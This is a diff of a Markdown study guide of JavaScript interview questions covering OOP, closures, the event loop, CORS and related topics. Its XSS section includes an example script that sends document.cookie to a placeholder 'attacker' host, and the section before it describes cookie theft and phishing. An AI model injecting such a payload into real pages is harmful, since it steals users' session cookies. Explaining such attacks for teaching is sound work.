@@ -5,7 +5,7 @@
 * http://ejohn.org/apps/learn/
 * http://eloquentjavascript.net/
 
-### 1.1 Name two programming paradigms important for JavaScript app developers?
+#### 1.1 Name two programming paradigms important for JavaScript app developers?
 
 * OOP programming -- Prototypal inheritance (also: prototypes, OLOO).
 * Functional programming (also: closures, first class functions, lambdas).
@@ -20,14 +20,14 @@
 * Null
 * Undefined
 
-### 1.2 Functional Progamming in JavaScript
+#### 1.2 Functional Progamming in JavaScript
 
 * Pure functions / function purity.
 * Avoid side-effects.
 * Simple function composition.
 * Feature support Functional programming: first-class functions, higher order functions, functions as arguments/values.
 
-### 2. OOP in javascript
+#### 2. OOP in javascript
 Read: http://javascriptissexy.com/oop-in-javascript-what-you-need-to-know/
 
 * **Inheritance** -- objects can inherit features from other objects
@@ -76,7 +76,7 @@ function inheritPrototype(childObject, parentObject) {
 }
 ```
 
-### 3. What is the difference between classical inheritance and prototypal inheritance?
+#### 3. What is the difference between classical inheritance and prototypal inheritance?
 
 First of, interesting comparison
 
@@ -165,19 +165,19 @@ var b = new B();
 b.doSomething();
 ```
 
-### 4. When is classical inheritance an appropriate choice?
+#### 4. When is classical inheritance an appropriate choice?
 
 Boo, the answer is rarely, almost never. “Favor object composition over class inheritance.”
 
-### 5. When is prototypal inheritance an appropriate choice? (whenever you need inheritance)
+#### 5. When is prototypal inheritance an appropriate choice? (whenever you need inheritance)
 Useful for:
 * Delegation (i.e., the prototype chain).
 * Concatenative (i.e. mixins, `Object.assign()`).
 * Functional (Not to be confused with functional programming. A function used to create a closure for private state/encapsulation).
 
-### 6. What are the pros and cons of functional programming vs object-oriented programming?
+#### 6. What are the pros and cons of functional programming vs object-oriented programming?
 
-#### OOP
+##### OOP
 
 **Pros**
 * Basic concept of objects, easy to interpret the meaning of method calls
@@ -187,7 +187,7 @@ Useful for:
 * OOP Typically depends on shared state.
 * Objects and behaviors are typically tacked together on the same entity, which may be accessed at random by any number of functions with non-deterministic order, which may lead to undesirable behavior such as race conditions.
 
-#### Functional Programming
+##### Functional Programming
 
 **Pros**
 * avoid any shared state or side-effects, which eliminates bugs caused by multiple functions competing for the same resources.
@@ -196,7 +196,7 @@ Useful for:
 **Cons**
 * Steeper learning curve
 
-### 7. What does “favor object composition over class inheritance” mean?
+#### 7. What does “favor object composition over class inheritance” mean?
 
 use **can-do**, **has-a**, or **uses-a** relationships INSTEAD OF **is-a** relationships.
 
@@ -206,7 +206,7 @@ use **can-do**, **has-a**, or **uses-a** relationships INSTEAD OF **is-a** relat
 * Avoid rigid taxonomy (forced is-a relationships that are eventually wrong for new use cases).
 * Make code more flexible.
 
-### 8. What are two-way data binding and one-way data flow, and how are they different?
+#### 8. What are two-way data binding and one-way data flow, and how are they different?
 
 *One way data flows are deterministic, whereas two-way binding can cause side-effects which are harder to follow and understand.*
 
@@ -222,9 +222,9 @@ use **can-do**, **has-a**, or **uses-a** relationships INSTEAD OF **is-a** relat
 * The effect is that data always flows in a single direction, which makes it easier to understand.
 * *Eg*: ReactJs
 
-### 9. What are the pros and cons of monolithic vs microservice architectures?
+#### 9. What are the pros and cons of monolithic vs microservice architectures?
 
-####Monolithic
+#####Monolithic
 
 App is written as one cohesive unit of code whose components are designed to work together, sharing the same memory space and resources.
 
@@ -237,7 +237,7 @@ App is written as one cohesive unit of code whose components are designed to wor
 * Tightly couple
 * Dedependecies, side-effects
 
-####Micro Service
+#####Micro Service
 
 App is made up of lots of smaller, independent applications capable of running in their own memory space and scaling independently from each other across potentially many separate machines.
 
@@ -249,7 +249,7 @@ App is made up of lots of smaller, independent applications capable of running i
 * Incur the overhead of separate module
 * Higher cost for operation
 
-### 10. What is asynchronous programming, and why is it important in JavaScript?
+#### 10. What is asynchronous programming, and why is it important in JavaScript?
 
 **Synchrounous**
 * Barring conditionals and function calls, code is executed sequentially from top-to-bottom, blocking on long-running tasks such as network requests and disk I/O.
@@ -261,7 +261,7 @@ App is made up of lots of smaller, independent applications capable of running i
 * A single program thread can handle many concurrent operations.
 
 
-### 11.1 Concurrency model and Event Loop in Javascript
+#### 11.1 Concurrency model and Event Loop in Javascript
 Read: https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop
 
 * JavaScript has a concurrency model based on an "event loop"
@@ -272,7 +272,7 @@ Read: https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop
 * heap: Objects are allocated in a heap which is just a name to denote a large mostly unstructured region of memory.
 * queue: A JavaScript runtime contains a message queue, which is a list of messages to be processed. When the stack is empty, a message is taken out of the queue and processed. The processing consists of calling the associated function (and thus creating an initial stack frame). The message processing ends when the stack becomes empty again
 
-#### Eventloop
+##### Eventloop
 * Each message is processed completely before any other message is processed
 * messages are added any time an event occurs and there is an event listener attached to it. If there is no listener, the event is lost
 * execution depends on the number of awaiting tasks in the queue
@@ -284,10 +284,10 @@ while(queue.waitForMessage()){
 }
 ```
 
-#### Non-blocking I/O
+##### Non-blocking I/O
 * Handling I/O is typically performed via events and callbacks, so when the application is waiting for an IndexedDB query to return or an XHR request to return, it can still process other things like user input.
 
-### 11.2 Trick to eliminate stackoverflow on loop function
+#### 11.2 Trick to eliminate stackoverflow on loop function
 
 ```javascript
 var list = readHugeList();
@@ -308,13 +308,13 @@ var nextListItem = function() {
 * When the event queue runs its timed-out event, the next item is processed and a timer is set to again invoke nextListItem.
 * Accordingly, the method is processed from start to finish **without a direct recursive call**, so the call stack remains clear, regardless of the number of iterations.
 
-### 12.1 null vs. undefined
+#### 12.1 null vs. undefined
 
 **undefined** -- value of the variable is not defined, undefined is a type. Assigning a new value to it does not change the value of the type undefined.
 
 **null** -- means empty or non-existent value ("no-value"), primitive value & can assign null to any variable. null is NOT object, but primitive value, typeof null is object though
 
-### 12.2 Difference between undefined and not defined in JavaScript
+#### 12.2 Difference between undefined and not defined in JavaScript
 
 * In JavaScript if you try to use a variable that doesn't exist and has not been declared, then JavaScript will throw an error var name is not defined and the script will STOP execute thereafter. But If you use typeof undeclared_variable then it will return undefined.
 ```javascript
@@ -328,7 +328,7 @@ console.log(y);  // Output: ReferenceError: y is not defined
 
 ```
 
-### 12.3 Best way to detect undefined object property in JavaScript
+#### 12.3 Best way to detect undefined object property in JavaScript
 * could use **typeof()** operator
 ```javascript
 if(typeof someProperty === 'undefined'){
@@ -349,7 +349,7 @@ new foo() instanceof foo; //==> false
 
 ```
 
-### 13.1 Difference between Function, Method and Constructor calls in JavaScript? (OOP concept)
+#### 13.1 Difference between Function, Method and Constructor calls in JavaScript? (OOP concept)
 
 **functions** -- not associated with object hence not invoked through any object.
 
@@ -394,13 +394,13 @@ emp1.age; // 28
 
 ```
 
-### 13.2 Differences between function Person(){}, var person = Person(), and var person = new Person()?
+#### 13.2 Differences between function Person(){}, var person = Person(), and var person = new Person()?
 
 * Function declaration
 * Function expression
 * function constructors
 
-### 13.3 Function Declarations vs. Function Expressions
+#### 13.3 Function Declarations vs. Function Expressions
 
 Read: https://javascriptweblog.wordpress.com/2010/07/06/function-declarations-vs-function-expressions/
 
@@ -432,7 +432,7 @@ var a = function bar() {
 
 ```
 
-### 13.4 What is Context?
+#### 13.4 What is Context?
 
 * Determined by how a function is invoked. When a function is called as a method of an object, **this** is set to the object the method is called on
 * The below is how to change a context of function ==> using call()
@@ -445,13 +445,13 @@ assert( fn() == this, "The context is the global object." );
 assert( fn.call(object) == object, "The context is changed to a specific object." );
 ```
 
-### 14. What is the difference between “==” and “===”?
+#### 14. What is the difference between “==” and “===”?
 
 **==** checks equality only,
 
 **===** checks for equality as well as the type.
 
-### 15. What is the drawback of creating true private in JavaScript? -- NOT RECOMMENDED
+#### 15. What is the drawback of creating true private in JavaScript? -- NOT RECOMMENDED
 
 * Memory inefficient because a new copy of the method would be created for each instance.
 * Should NOT use private method unless it's really necessary
@@ -486,7 +486,7 @@ var emp3 = new Employee("Ren","Pluto",2500);
 
 ```
 
-### 17. Explain **delete** operator and what it does
+#### 17. Explain **delete** operator and what it does
 
 * delete operator is used to delete a property from an object
 * delete operator DOES NOT affect local/or global variable
@@ -537,7 +537,7 @@ console.log(emp1.company); //Output: 'xyz'
 
 ```
 
-### 18. What is JavaScript Self-Invoking anonymous function or Self-Executing anonymous function.
+#### 18. What is JavaScript Self-Invoking anonymous function or Self-Executing anonymous function.
 (notice: these 2 names are meant for the same thing!!!)
 
 * Runs immediately/automatically when we define it and self-invoking anonymous function doesn't have any name at all.
@@ -554,11 +554,11 @@ console.log(emp1.company); //Output: 'xyz'
 })();
 ```
 
-### 19.1 What is the difference between array vs. object?
+#### 19.1 What is the difference between array vs. object?
 
 * Read: http://nfriedly.com/techblog/2009/06/advanced-javascript-objects-arrays-and-array-like-objects/
 
-#### Object / Associative Array
+##### Object / Associative Array
 
 ```javascript
 var fancyObj = {
@@ -595,12 +595,12 @@ eight.addto(9);  // works
 
 ```
 
-#### Array
+##### Array
 * Type of object used for storing multiple values in a single variable. Each value gets **numeric index** and may be any data type
 * **length** property ==> how many items are in the array, automatically updated when add/remove items to the array.
 * Can use the following functions: push(), pop(), sort(), slice(), splice(), ...
 
-### 19.2 How to check if an object is an array or not?
+#### 19.2 How to check if an object is an array or not?
 
 * The best way to find whether an object is instance of a particular class or not using **toString** method from Object.prototype
 ```javascript
@@ -610,9 +610,9 @@ if(Object.prototype.toString.call(arrayList) === '[object Array]') {
 ```
 With mordern browser, **Array.isArray()** method can also be used
 
-### 19.3 What are the way by which we can create object in JavaScript? - 3 ways
+#### 19.3 What are the way by which we can create object in JavaScript? - 3 ways
 
-#### (1) Function Based
+##### (1) Function Based
 ```javascript
 function Employee(fName, lName, age, salary) {
     this.firstName = fName;
@@ -627,7 +627,7 @@ var employee2 = new Employee('Ryan', 'Jor', 26, '3000$');
 
 ```
 
-#### (2) Object Literal
+##### (2) Object Literal
 * Object Literal is best way to create an object and this is used frequently.
 ```javascript
 var employee = {
@@ -652,7 +652,7 @@ var employee = {
 }
 ```
 
-#### (3) Using JavaScript "new" keyword
+##### (3) Using JavaScript "new" keyword
 ```javscript
 var employee = new Object(); // Created employee object using new keywords and Object()
 employee.name = 'Nishant';
@@ -661,7 +661,7 @@ employee.getName = function(){
 }
 ```
 
-### 19.4 How to empty an array in JavaScript? -- 4 methods
+#### 19.4 How to empty an array in JavaScript? -- 4 methods
 
 * (1)
 ```javascript
@@ -689,7 +689,7 @@ while(arrayList.length) {
 }
 ```
 
-### 21. What is "this" in JS?
+#### 21. What is "this" in JS?
 
 At the time of execution of function, JavaScript engine sets a property to the function called "this" which refer to the current execution context. this is **always** refer to an object and depends on how function is called.
 
@@ -720,23 +720,23 @@ var func = User.getCount.bind(User);
 console.log(func());
 ```
 
-### 22. What are differences between host object and native object?
+#### 22. What are differences between host object and native object?
 
-#### Native object
+##### Native object
 
 * core predefined objects always available in JavaScript. Defined in the ECMAScript spec.
 * Eg: Object (constructor), Date, Math, parseInt, eval, string methods like indexOf and replace, array methods, ...
 
-#### Host object
+##### Host object
 
 * provided by the browser environment.
 * Eg: window, document, location, history, XMLHttpRequest, setTimeout, getElementsByTagName, querySelectorAll
 
-#### User object
+##### User object
 
 * objects defined in JavaScript code
 
-### 23. Why extending build in JavaScript object is a bad idea?
+#### 23. Why extending build in JavaScript object is a bad idea?
 Read: http://programmers.stackexchange.com/questions/104320/why-is-extending-the-dom-built-in-object-prototypes-a-bad-idea
 * Lack of specification
 * Host objects have no rules
@@ -744,11 +744,11 @@ Read: http://programmers.stackexchange.com/questions/104320/why-is-extending-the
 * Performance overhead (manual extension in older browser, slow, inconvenient & don't scale)
 * IE is really bad!
 
-### 24.1 Why does nearly every object have a toString method?
+#### 24.1 Why does nearly every object have a toString method?
 
 Most inherited from Object.prototype or define it on its own (or inherit it from their custom prototype). ==> inherit toString() method from the interface/parent
 
-### 24.2 what's different between Object.prototype.toString.call and typeof?
+#### 24.2 what's different between Object.prototype.toString.call and typeof?
 
 * toString() is a method, that returns a string that represents the current object (ex: Function), can override it to return anything you want.
 
@@ -764,7 +764,7 @@ Object.prototype.toString.call(new Date()).slice(8, -1)   === "Date";
 Object.prototype.toString.call(new RegExp()).slice(8, -1) === "RegExp";
 ```
 
-### 25.1 How would you apply asynchronous call without any help of library?
+#### 25.1 How would you apply asynchronous call without any help of library?
 Read: http://krasimirtsonev.com/blog/article/7-lines-JavaScript-library-for-calling-asynchronous-functions
 
 ```javascript
@@ -796,7 +796,9 @@ queue([
 ], obj);
 ```
 
-### 25.2 Pure JS Promise -- Write async function in JS (This is my interview question at Yahoo)
+#### 25.2 Pure JS Promise -- Write async function in JS (This is my interview question at Yahoo)
+Read: https://ponyfoo.com/articles/understanding-javascript-async-await
+
 ```javascript
 var remoteData = {'test': 'hi'};
 var getData = function () {
@@ -813,7 +815,7 @@ getData().then(function(data) {
 getData().then(data => alert(data));
 ```
 
-### 26.1 What is the difference between slice, substr, substring?
+#### 26.1 What is the difference between slice, substr, substring?
 
 NON OF THEM MUTATES
 
@@ -821,7 +823,7 @@ NON OF THEM MUTATES
 * String.substring( from [, to ] ) ==> result of substring will NOT contain character at final index
 * String.substr( start [, length ] )
 
-### 26.2 What is differences between Array.slice() and Array.splice()?
+#### 26.2 What is differences between Array.slice() and Array.splice()?
 Read: http://ariya.ofilabs.com/2014/02/javascript-array-slice-vs-splice.html
 
 **slice()** -- return a new array containing the elements from the given start index up the one right before the specified end index, DOES NOT CHANGE the array which invokes it
@@ -838,7 +840,7 @@ console.log(x)           // [14]
 console.log(y)           // [3, 77]
 ```
 
-### 26.3 Differences between array.map(), array.reduce(), array.filter(). Example for function chain call
+#### 26.3 Differences between array.map(), array.reduce(), array.filter(). Example for function chain call
 
 Read: http://cryto.net/~joepie91/blog/2015/05/04/functional-programming-in-javascript-map-filter-reduce/
 
@@ -903,10 +905,10 @@ var newNumbers = numbers.reduce(function(newArray, number){
 console.log("The final numbers are", newNumbers); // [1, 2, 2, 3, 4, 4]
 ```
 
-### 27. What is the reason for wrapping the entire content of a JavaScript source file in a function block?
+#### 27. What is the reason for wrapping the entire content of a JavaScript source file in a function block?
 * Creates a private namespace and thereby helps avoid potential name clashes between different JavaScript modules and libraries.
 
-### 28. What are the benefits of including 'use strict' at the beginning of a JavaScript source file? -- Good practice
+#### 28. What are the benefits of including 'use strict' at the beginning of a JavaScript source file? -- Good practice
 
 Enforce stricter parsing and error handling on your JavaScript code at runtime. Code errors that would otherwise have been ignored or would have failed silently will now generate errors or throw exceptions.
 
@@ -922,7 +924,7 @@ Enforce stricter parsing and error handling on your JavaScript code at runtime. 
 
 **Throws error on invalid usage of delete.** -- The delete operator (used to remove properties from objects) cannot be used on non-configurable properties of the object. Non-strict code will fail silently when an attempt is made to delete a non-configurable property, whereas strict mode will throw an error in such a case.
 
-### 28. What is a closure in JS?
+#### 28. What is a closure in JS?
 * function defined inside another function (called parent function) and has access to the variable which is declared and defined in parent function scope. (Inner function vs. outer function)
 
 **The closure has access to variable in three scopes:**
@@ -930,7 +932,7 @@ Enforce stricter parsing and error handling on your JavaScript code at runtime. 
 * Variable declared in parent function scope
 * Variable declared in global namespace
 
-### 29. Javascript Timer -- Difference between setTimeout() and setInterval()?
+#### 29. Javascript Timer -- Difference between setTimeout() and setInterval()?
 
 Referenced from:
 https://web.archive.org/web/20130101080638/http://bonsaiden.github.com/JavaScript-Garden/
@@ -939,7 +941,7 @@ https://web.archive.org/web/20130101080638/http://bonsaiden.github.com/JavaScrip
 * An anonymous function should be passed that then takes care of the actual call.
 * **setInterval** should be avoided because its scheduler is not blocked by executing JavaScript.
 
-#### setTimeout()/clearTimeout()
+##### setTimeout()/clearTimeout()
 ==> executes a function, once, after waiting a specified number of milliseconds
 
 * Execute only ONCE
@@ -960,7 +962,7 @@ function Foo() {
 new Foo();
 ```
 
-#### setInterval()/clearInterval()
+##### setInterval()/clearInterval()
 ==> executes a function, over and over again, at specified time intervals
 
 * Different from setTimeout, it will execute the function every X milliseconds, but its use is discouraged.
@@ -986,7 +988,7 @@ function foo(){
 foo();
 ```
 
-### 30. Graceful Degradation vs. Progressive Enhancement?
+#### 30. Graceful Degradation vs. Progressive Enhancement?
 
 **Graceful Degradation**
 * Building a web site or application so it provides a good level of user experience in modern browsers. However, it will degrade gracefully for those using older browsers. The system may not be as pleasant or as pretty, but the basic functionality will work on older systems.
@@ -994,7 +996,7 @@ foo();
 **Progressive Enhancement**
 * The web site or application would establish a base-level of user experience for most browsers. More advanced functionality would then be added when a browser supports it.
 
-### 31. How are errors gracefully handled in JavaScript?
+#### 31. How are errors gracefully handled in JavaScript?
 * handled via try/catch/finally blocks; this allows you to avoid those unfriendly error messages
 
 ```javascript
@@ -1021,10 +1023,10 @@ window.onerror = function (errorMsg, url, lineNumber, column, errorObj) {
 }
 ```
 
-### 32. How to handle cross domain request in JavaScript?
+#### 32. How to handle cross domain request in JavaScript?
 Read: https://jvaneyck.wordpress.com/2014/01/07/cross-domain-requests-in-javascript/
 
-#### CORS (Cross-Origin Resource Sharing)
+##### CORS (Cross-Origin Resource Sharing)
 * Support all type of HTTP requests
 * Server need to return additional HTTP headers
 * Not supported on older versions of Internet Explorer. For “complex” requests, needs to make an extra HTTP call (preflighted requests). Some firewalls strip CORS headers.
@@ -1041,7 +1043,7 @@ Content-Length: 62
 
 ```
 
-#### JSONP (JavaScript Object Notation with Padding)
+##### JSONP (JavaScript Object Notation with Padding)
 * only be used to perform Cross-Domain GET requests
 * Server side must support JSONP. JSONP could expose your website to a plethora of security vulnerabilities if the server is compromised
 
@@ -1064,7 +1066,7 @@ myCallbackFunction({'response': 'hello world from JSONP!'});
 
 ```
 
-#### SERVER-SIDE PROXY
+##### SERVER-SIDE PROXY
 * No server-side modification required (but you need an extra proxy component in your origin)
 * Back-end performs the request instead of the browser. Could prove problematic for authentication
 
@@ -1079,7 +1081,7 @@ Content-Type: application/json; charset=utf-8
 { "response": "This is data returned from the server, proxy style!" }
 ```
 
-### 33. Function declaration (Defined at run time vs. defined at parse time)
+#### 33. Function declaration (Defined at run time vs. defined at parse time)
 
 * One of the advantages of run time **function declaration** is that you can declare function based on certain condition.
 * We COULD NOT do the same thing if using functiong defined at parse time
@@ -1109,7 +1111,7 @@ function bar() {
 </script>
 ```
 
-### 34. What is difference between private variable, public variable and static variable? How we achieve this in JS?
+#### 34. What is difference between private variable, public variable and static variable? How we achieve this in JS?
 
 Read: http://robertnyman.com/2008/10/14/javascript-how-to-get-private-privileged-public-and-static-members-properties-and-methods/
 
@@ -1164,7 +1166,7 @@ cartman.town; // undefined
 Kid.town; // "South Park"
 
 ```
-### 35. CommonJS vs. AMD
+#### 35. CommonJS vs. AMD
 
 Read: http://stackoverflow.com/questions/16521471/relation-between-commonjs-amd-and-requirejs
 
@@ -1182,7 +1184,7 @@ Read: http://stackoverflow.com/questions/16521471/relation-between-commonjs-amd-
 * **Only support objects as modules**
 
 
-### 36. Function length and method overloading
+#### 36. Function length and method overloading
 
 * We could use function length to get number of arguments passed in function call
 * Can use this to leverage method overloading
@@ -1207,13 +1209,13 @@ function addMethod(object, name, fn){
 }
 ```
 
-### 37.1 What is malicious JS and its consequences?
+#### 37.1 What is malicious JS and its consequences?
 
 * JavaScript has access to some of the user's sensitive information, such as cookies.
 * JavaScript can send HTTP requests with arbitrary content to arbitrary destinations by using XMLHttpRequest and other mechanisms.
 * JavaScript can make arbitrary modifications to the HTML of the current page by using DOM manipulation methods.
 
-##### Consequences:
+###### Consequences:
 
 * **Cookies theft** The attacker can access the victim's cookies associated with the website using document.cookie, send them to his own server, and use them to extract sensitive information like session IDs.
 
@@ -1221,7 +1223,7 @@ function addMethod(object, name, fn){
 
 * **Phishing** The attacker can insert a fake login form into the page using DOM manipulation, set the form's action attribute to target his own server, and then trick the user into submitting sensitive information.
 
-### 37.2 What is XSS attack?
+#### 37.2 What is XSS attack?
 
 Referenced:
 * http://www.veracode.com/security/xss
@@ -1233,7 +1235,7 @@ window.location='http://attacker/?cookie='+document.cookie
 </script>
 ```
 
-### 38. How to set delay time for autocomplete request? (Apple Interview)
+#### 38. How to set delay time for autocomplete request? (Apple Interview)
 
 * We could leverage setTimeout() for this
 
@@ -1252,5 +1254,9 @@ function displaySearch() {
     alert('result');
 }
 ```
+
+#### 39. HashTable in JS
+* Concept of associative arrays
+* Read: https://gist.github.com/alexhawkins/f6329420f40e5cafa0a4
 
 
